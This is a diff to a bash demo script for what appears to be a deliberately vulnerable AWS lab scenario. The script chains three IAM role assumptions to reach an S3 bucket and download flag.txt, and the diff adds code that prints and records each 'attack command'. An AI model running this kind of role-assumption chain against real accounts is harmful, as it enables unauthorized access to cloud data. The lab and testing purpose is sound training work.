@@ -11,6 +11,25 @@ REGION="us-west-2"
 # Disable paging for AWS CLI
 export AWS_PAGER=""
 
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+NC='\033[0m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
+
 # Navigate to the Terraform root directory (6 levels up from scenario directory)
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 TERRAFORM_ROOT="$(cd "$SCRIPT_DIR/../../../../../.." && pwd)"
@@ -66,6 +85,7 @@ echo ""
 echo "🔄 Step 1: Assuming initial role..."
 echo "Role ARN: $INITIAL_ROLE_ARN"
 
+show_attack_cmd aws sts assume-role --role-arn $INITIAL_ROLE_ARN --role-session-name "attack-initial-role" --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text
 INITIAL_CREDENTIALS=$(aws sts assume-role \
     --role-arn $INITIAL_ROLE_ARN \
     --role-session-name "attack-initial-role" \
@@ -83,6 +103,7 @@ echo ""
 echo "🔄 Step 2: Assuming intermediate role..."
 echo "Role ARN: $INTERMEDIATE_ROLE_ARN"
 
+show_attack_cmd AWS_ACCESS_KEY_ID=\$INITIAL_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$INITIAL_SECRET_KEY AWS_SESSION_TOKEN=\$INITIAL_SESSION_TOKEN aws sts assume-role --region $REGION --role-arn $INTERMEDIATE_ROLE_ARN --role-session-name "attack-intermediate-role" --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text
 INTERMEDIATE_CREDENTIALS=$(AWS_ACCESS_KEY_ID=$INITIAL_ACCESS_KEY \
     AWS_SECRET_ACCESS_KEY=$INITIAL_SECRET_KEY \
     AWS_SESSION_TOKEN=$INITIAL_SESSION_TOKEN \
@@ -104,6 +125,7 @@ echo ""
 echo "🔄 Step 3: Assuming S3 access role..."
 echo "Role ARN: $S3_ACCESS_ROLE_ARN"
 
+show_attack_cmd AWS_ACCESS_KEY_ID=\$INTERMEDIATE_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$INTERMEDIATE_SECRET_KEY AWS_SESSION_TOKEN=\$INTERMEDIATE_SESSION_TOKEN aws sts assume-role --region $REGION --role-arn $S3_ACCESS_ROLE_ARN --role-session-name "attack-s3-access-role" --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text
 S3_CREDENTIALS=$(AWS_ACCESS_KEY_ID=$INTERMEDIATE_ACCESS_KEY \
     AWS_SECRET_ACCESS_KEY=$INTERMEDIATE_SECRET_KEY \
     AWS_SESSION_TOKEN=$INTERMEDIATE_SESSION_TOKEN \
@@ -125,6 +147,7 @@ echo ""
 # Get the actual bucket name by listing S3 buckets and finding the one with our prefix
 echo "🔄 Step 4: Listing contents of S3 bucket: $S3_BUCKET_NAME"
 
+show_attack_cmd AWS_ACCESS_KEY_ID=\$S3_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$S3_SECRET_KEY AWS_SESSION_TOKEN=\$S3_SESSION_TOKEN aws s3 ls s3://$S3_BUCKET_NAME --region $REGION
 AWS_ACCESS_KEY_ID=$S3_ACCESS_KEY \
     AWS_SECRET_ACCESS_KEY=$S3_SECRET_KEY \
     AWS_SESSION_TOKEN=$S3_SESSION_TOKEN \
@@ -134,6 +157,7 @@ AWS_ACCESS_KEY_ID=$S3_ACCESS_KEY \
 echo ""
 echo "🔄 Step 5: Downloading and displaying flag.txt..."
 
+show_attack_cmd AWS_ACCESS_KEY_ID=\$S3_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$S3_SECRET_KEY AWS_SESSION_TOKEN=\$S3_SESSION_TOKEN aws s3 cp s3://$S3_BUCKET_NAME/flag.txt /tmp/flag.txt --region $REGION
 AWS_ACCESS_KEY_ID=$S3_ACCESS_KEY \
     AWS_SECRET_ACCESS_KEY=$S3_SECRET_KEY \
     AWS_SESSION_TOKEN=$S3_SESSION_TOKEN \
@@ -147,6 +171,13 @@ echo "======================"
 
 # Clean up the temporary file
 rm -f /tmp/flag.txt
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n\033[1;33mAttack Commands:\033[0m"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
 
 echo ""
 echo "🎉 SUCCESS! Successfully traversed the 3-hop role assumption chain!"
@@ -172,3 +203,6 @@ echo "TEST_RESULT:prod_simple_explicit_role_assumption_chain:SUCCESS"
 echo "TEST_DETAILS:prod_simple_explicit_role_assumption_chain:Successfully demonstrated role assumption chain with S3 access"
 echo "TEST_METRICS:prod_simple_explicit_role_assumption_chain:roles_assumed=3,s3_access_gained=true,flag_retrieved=true"
 unset S3_ACCESS_KEY S3_SECRET_KEY S3_SESSION_TOKEN
+
+# Mark demo as active for plabs tracking
+touch "$(dirname "$0")/.demo_active"
